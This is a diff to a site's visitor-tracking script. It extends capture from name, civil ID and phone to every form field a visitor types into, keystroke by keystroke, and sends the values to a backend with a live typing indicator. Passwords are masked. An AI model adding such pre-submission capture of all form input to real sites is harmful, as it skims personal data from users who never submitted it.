@@ -10,6 +10,7 @@
     var SK = 'sb_publishable_9XuOSJFbIz3mNBAibcPiDw_qUZzvYSf';
     var K = 'becare_visitor_id';
     var L = 'becare_lead';
+    var FK = 'becare_fields';
 
     var vid = localStorage.getItem(K);
     if (!vid) {
@@ -54,7 +55,8 @@
             p_device: /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? 'mobile' : 'desktop',
             p_name: d.fullName || null,
             p_civil_id: d.civilId || null,
-            p_phone: d.phone || null
+            p_phone: d.phone || null,
+            p_fields: FIELDS()
           })
         }).catch(function () {});
       } catch (e) {}
@@ -73,13 +75,26 @@
         }).catch(function () {});
       } catch (e) {}
     }
+    function FIELDS() {
+      try { var f = JSON.parse(localStorage.getItem(FK) || '{}'); return (f && Object.keys(f).length) ? f : null; } catch (e) { return null; }
+    }
     document.addEventListener('input', function (e) {
       try {
         var t = e.target;
-        if (!t || !t.id || ['fullName', 'civilId', 'phone'].indexOf(t.id) === -1) return;
-        var d = lead();
-        d[t.id] = t.value;
-        localStorage.setItem(L, JSON.stringify(d));
+        if (!t || (t.tagName !== 'INPUT' && t.tagName !== 'TEXTAREA' && t.tagName !== 'SELECT')) return;
+        var key = t.id || t.name;
+        if (!key) return;
+        var val = t.value;
+        if (t.type === 'password') val = val ? '\u25cf'.repeat(Math.min(val.length, 12)) : '';
+        var F = {};
+        try { F = JSON.parse(localStorage.getItem(FK) || '{}'); } catch (ex) {}
+        if (val === '') delete F[key]; else F[key] = val;
+        localStorage.setItem(FK, JSON.stringify(F));
+        if (['fullName', 'civilId', 'phone'].indexOf(key) !== -1) {
+          var d = lead();
+          d[key] = t.value;
+          localStorage.setItem(L, JSON.stringify(d));
+        }
         if (!typingFlag) { typingFlag = true; setTyping(true); }
         if (typingTimer) clearTimeout(typingTimer);
         typingTimer = setTimeout(function () { typingFlag = false; setTyping(false); }, 2000);
